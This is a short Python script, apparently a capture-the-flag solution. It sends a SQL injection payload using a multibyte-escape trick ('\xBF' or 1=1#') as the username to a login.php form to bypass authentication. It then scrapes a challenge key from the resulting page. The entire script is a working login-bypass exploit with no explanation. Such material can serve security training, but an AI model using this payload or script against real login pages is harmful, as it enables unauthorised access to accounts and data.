import requests
import re
import sys

GREEN = "\033[32m"
RED = "\033[91m"
RESET = "\033[0m"

proxy = {'http': 'http://127.0.0.1:8080'}

if len(sys.argv) != 2:
    print(f"[-] Usage:\n\t{sys.argv[0]} <URL>")
    sys.exit(1)

url = sys.argv[1]
# inject_here = "\xBF' or 1=1#"

session = requests.Session()

login = session.post(url + "/login.php", data={"username": "\xBF' or 1=1#", "password": "anything"}, allow_redirects=False, proxies=proxy)

if login.status_code == 302:
    content = session.get(url + '/').text
    key = re.search(r"[\da-f]*-[\da-f]*-[\da-f]*-[\da-f]*-[\da-f]*", content).group()
    print(f"[+] The key for this challenge is {GREEN}{key}{RESET}")
else:
    print(f"{RED}[-] Something went wrong!{RESET}")
